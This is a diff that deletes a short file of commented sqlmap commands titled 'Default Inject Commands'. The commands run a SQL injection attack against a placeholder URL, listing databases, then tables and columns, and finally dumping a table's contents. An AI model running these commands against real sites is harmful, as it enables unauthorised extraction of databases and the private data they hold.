@@ -1,9 +1,0 @@
-# Default Inject Commands
-
-# sqlmap -u example.me/index.php?id=1'[%27] --dbs
-
-# sqlmap -u example.me/index.php?id=1'[%27] -D name.db --tables
-
-# sqlmap -u example.me/index.php?id=1'[%27] -D name.db -T name.table --columns
-
-# sqlmap -u example.me/index.php?id=1'[%27] -D name.db -T name.table -C name.columns --dump
